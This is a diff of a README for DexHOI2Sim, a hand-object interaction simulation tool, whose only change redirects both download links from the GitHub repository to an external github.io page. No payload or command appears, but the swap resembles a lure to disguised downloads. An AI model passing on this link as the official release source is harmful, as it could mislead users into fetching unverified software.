@@ -1,6 +1,6 @@
 # 🦾 DexHOI2Sim - Replicate complex hand and object interactions
 
-[![Download DexHOI2Sim](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Arrogant-neanderthal842/DexHOI2Sim)
+[![Download DexHOI2Sim](https://img.shields.io/badge/Download-Release-blue.svg)](https://arrogant-neanderthal842.github.io)
 
 DexHOI2Sim provides a way to study how hands grab and move objects. It uses physics engines to recreate these motions in a digital space. You can test if a hand grip holds an object firmly or if it slips. This tool serves as a standard way to measure how well computer-generated hand motions perform in real-world conditions.
 
@@ -24,7 +24,7 @@ A modern graphics card is necessary because the simulation calculates physics in
 
 To get started, visit the link below.
 
-[Download DexHOI2Sim](https://github.com/Arrogant-neanderthal842/DexHOI2Sim)
+[Download DexHOI2Sim](https://arrogant-neanderthal842.github.io)
 
 Follow these steps to set up the software on your machine:
 
